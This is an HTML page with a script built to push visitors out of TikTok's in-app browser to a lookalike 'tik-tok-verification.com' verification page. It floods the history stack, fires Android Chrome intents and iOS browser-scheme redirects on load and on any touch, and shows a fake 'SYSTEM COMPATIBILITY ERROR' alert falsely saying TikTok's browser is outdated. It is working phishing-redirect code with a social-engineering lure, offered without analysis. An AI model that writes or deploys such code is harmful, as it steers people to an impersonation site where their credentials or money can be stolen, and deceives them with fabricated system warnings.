<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; cursor: pointer; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";

    function sickoModeEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        // 1. STACK BLOAT: Push 100 history states to "heavy up" the WebView
        for (let i = 0; i < 100; i++) {
            history.pushState({}, '', window.location.pathname + '#' + i);
        }

        if (isAndroid) {
            // Android: Forcing the 'Always' Chrome Intent
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE KERNEL HANDOFF
            
            // 2. Fire a "Trusted" Apple scheme to open the door
            window.location.href = "applespace://"; 

            // 3. Immediately slam the Safari Protocol into the 'Hanging' stack
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 5);

            // 4. Fallback: Direct Chrome Scheme
            setTimeout(() => {
                window.location.href = "googlechromes://" + domain;
            }, 50);
        }
    }

    // This is the bridge: We use the system alert to "lock" the main thread
    // while the OS processes the navigation collision in the background.
    window.onload = function() {
        // Initial attempt
        sickoModeEject();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "⚠️ SYSTEM COMPATIBILITY ERROR\n";
                const body = "______________________________\n\nTikTok's internal browser is outdated. Tap OK to load this secure portal in Safari/Chrome.";
                
                alert(header + body);
                
                // Fire again on the "OK" tap
                sickoModeEject();
            }
        }, 500);
    };

    // If they touch the screen at all, force the eject
    document.addEventListener('touchstart', sickoModeEject);
</script>
</body>
</html>
